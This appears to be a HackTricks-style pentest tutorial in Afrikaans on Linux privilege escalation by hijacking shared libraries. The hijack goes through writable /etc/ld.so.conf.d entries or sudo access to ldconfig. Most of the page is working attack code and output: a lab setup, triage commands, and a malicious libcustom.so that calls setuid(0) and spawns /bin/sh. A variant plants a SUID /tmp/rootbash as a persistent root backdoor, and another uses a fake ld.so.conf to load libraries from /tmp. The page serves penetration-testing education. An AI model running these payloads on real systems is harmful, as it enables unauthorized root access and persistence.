# ld.so privesc exploit-voorbeeld

{{#include ../../banners/hacktricks-training.md}}

## Berei die omgewing voor

In die volgende afdeling vind jy die kode van die lêers wat ons gaan gebruik om die omgewing voor te berei

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Skep** daardie lêers op jou masjien in dieselfde vouer
2. **Kompileer** die **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopieer** `libcustom.so` na `/usr/lib` en verfris die kas: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root-voorregte)
4. **Kompileer** die **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Gaan die omgewing na

Maak seker dat _libcustom.so_ vanaf _/usr/lib_ **gelaai** word en dat jy die binêre lêer kan **uitvoer**.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Nuttige triage-opdragte

Wanneer jy ’n werklike teiken aanval, verifieer die **presiese biblioteeknaam** wat die binêre lêer benodig en wat die loader **tans resolve**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
'n Paar nuttige slaggate:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **werk gewoonlik nie** omdat die herleiding deur jou huidige shell gedoen word. Gebruik eerder
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged** binaries ignoreer `LD_LIBRARY_PATH`/`LD_PRELOAD` in
**secure-execution mode**, maar directories afkomstig van `/etc/ld.so.conf` is
steeds deel van die trusted loader configuration, dus kan hierdie misconfiguration
steeds privileged programs beïnvloed.
- Op nuwer glibc-weergawes stel die dynamic loader ook
`--list-diagnostics` bloot, wat handig is om cache resolution en
`glibc-hwcaps` subdirectory selection te debug wanneer 'n hijack nie optree
soos verwag nie.

## Exploit

In hierdie scenario gaan ons veronderstel dat **iemand 'n vulnerable entry geskep het** binne 'n lêer in _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Die kwesbare vouer is _/home/ubuntu/lib_ (waar ons skryftoegang het).\
**Laai af en kompileer** die volgende kode binne daardie pad:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
As jy verwag dat **root** (of ’n ander geprivilegieerde rekening) later die kwesbare binary sal uitvoer, is dit gewoonlik beter om ’n **root-owned artifact** agter te laat eerder as om ’n interaktiewe shell te begin. Byvoorbeeld:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Dan, nadat die bevoorregte uitvoering plaasgevind het, kan jy `/tmp/rootbash -p` gebruik.

Noudat ons die **kwaadwillige libcustom-biblioteek binne die verkeerd gekonfigureerde** pad **geskep** het, moet ons wag vir ’n **herlaai** of totdat die root user **`ldconfig`** uitvoer (_indien jy hierdie binary as **sudo** kan uitvoer of dit die **suid bit** het, sal jy dit self kan uitvoer_).

Nadat dit gebeur het, **kontroleer weer** waar die `sharedvuln`-uitvoerbare lêer die `libcustom.so`-biblioteek vandaan laai:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Soos jy kan sien, laai dit vanaf **`/home/ubuntu/lib`**, en indien enige gebruiker dit uitvoer, sal ’n shell uitgevoer word:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Let daarop dat ons in hierdie voorbeeld nie privileges ge-escalate het nie, maar deur die commands wat uitgevoer word te wysig en **te wag vir root of ’n ander privileged user om die vulnerable binary uit te voer**, sal ons privileges kan eskaleer.

### Ander misconfigurations - Dieselfde vuln

In die vorige voorbeeld het ons ’n misconfiguration nagemaak waar ’n administrator **’n non-privileged folder binne ’n configuration file binne `/etc/ld.so.conf.d/` gestel het**.\
Maar daar is ander misconfigurations wat dieselfde vulnerability kan veroorsaak. As jy **write permissions** in enige **config file** binne `/etc/ld.so.conf.d`, in die folder `/etc/ld.so.conf.d` of in die file `/etc/ld.so.conf` het, kan jy dieselfde vulnerability configureer en exploit.

## Exploit 2

**Gestel jy het sudo privileges oor `ldconfig`**.\
Jy kan vir `ldconfig` aandui **waarvandaan om die conf files te laai**, sodat ons dit kan gebruik om `ldconfig` arbitrary folders te laat laai.\
Kom ons skep dus die files en folders wat nodig is om "/tmp" te laai:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Nou, soos aangedui in die **previous exploit**, **skep die malicious library binne `/tmp`**.\
En laastens, laai die pad en kyk waarvandaan die binary die library laai:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Soos jy kan sien, kan jy dieselfde kwesbaarheid uitbuit as jy sudo-regte oor `ldconfig` het.**



## Verwysings

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
